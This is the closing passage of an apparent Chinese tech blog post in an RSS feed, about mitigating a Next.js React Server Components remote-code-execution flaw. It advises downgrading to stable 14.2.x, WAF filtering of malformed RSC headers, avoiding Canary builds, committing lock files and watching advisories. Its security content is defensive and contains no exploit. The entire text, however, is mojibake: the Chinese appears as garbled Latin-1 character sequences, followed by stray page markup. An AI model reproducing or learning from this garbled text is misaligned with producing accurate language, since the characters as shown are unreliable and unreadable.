<li><strong>é™çº§ä¿å¹³å®‰</strong>ï¼šå¦‚æœæ²¡ç”¨åˆ°æœ€æ–°çš„ RSC ç‰¹æ€§ï¼Œå°è¯•é€€å›åˆ° <strong>Next.js 14.2.x ç¨³å®šç‰ˆ</strong>ï¼ˆç¡®è®¤ä¸ºé Canary ç‰ˆæœ¬ï¼‰ã€‚</li>
<li><strong>WAF æŒ¡ä¸€æŒ¡</strong>ï¼šåœ¨ Nginx æˆ–è€…äº‘å‚å•†çš„ WAF ä¸Šï¼Œé’ˆå¯¹å¼‚å¸¸çš„å¤§åŒ…ä½“æˆ–è€…ç•¸å½¢çš„ RSC è¯·æ±‚å¤´åšæ‹¦æˆªã€‚ä½†è¯´å®è¯ï¼Œè¿™æ‹›é˜²å›å­ä¸é˜²å°äººã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-11">5. è¿™æ˜¯ä¸€ä¸ªæ•™è®­</h3>
<p>è¿™æ¬¡æ¼æ´ä¹Ÿç»™å’±ä»¬æäº†ä¸ªé†’ï¼š</p>
<ol>
<li><strong>ç”Ÿäº§ç¯å¢ƒåˆ«ä¹±ç”¨ Canary</strong>ï¼šé™¤éä½ çœŸçš„éœ€è¦é‚£ä¸ªç‰¹æ€§ï¼Œå¦åˆ™ç¨³å®šç‰ˆæ‰æ˜¯ç‹é“ã€‚</li>
<li><strong>Lock æ–‡ä»¶è¦æäº¤</strong>ï¼š<code>package-lock.json</code> / <code>yarn.lock</code> æ˜¯ä¿å‘½ç¬¦ï¼Œåˆ« gitignore äº†ã€‚</li>
<li><strong>å…³æ³¨å®‰å…¨å…¬å‘Š</strong>ï¼šæ²¡äº‹å¤šåˆ·åˆ· GitHub Advisoryï¼Œæˆ–è€…å…³æ³¨æˆ‘ï¼ˆç–¯ç‹‚æš—ç¤ºï¼‰ï¼Œæœ‰å¤§ç“œç¬¬ä¸€æ—¶é—´å¸¦ä½ åƒã€‚</li>
</ol>
<hr/>
<p><strong>æœ€å</strong>ï¼š
æ­¤æ—¶æ­¤åˆ»ï¼Œè¿˜åœ¨åŠ ç­ä¿® Bug çš„è¿ç»´å’Œå¼€å‘å…„å¼Ÿä»¬ï¼Œè¾›è‹¦äº†ï¼æ„¿ä¸–é—´å†æ—  RCEã€‚ğŸ™</p>
<p><em>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« æ•‘äº†ä½ çš„æœåŠ¡å™¨ï¼Œç‚¹ä¸ªèµå†èµ°å‘—~</em></p>
<hr/>
<blockquote>
<p><strong>å…è´£å£°æ˜</strong>: æœ¬æ–‡æ“ä½œä»…ä¾›å‚è€ƒï¼Œç”Ÿäº§ç¯å¢ƒå˜æ›´å‰è¯·åŠ¡å¿…åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯ï¼ç‚¸äº†åˆ«æ‰¾æˆ‘ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>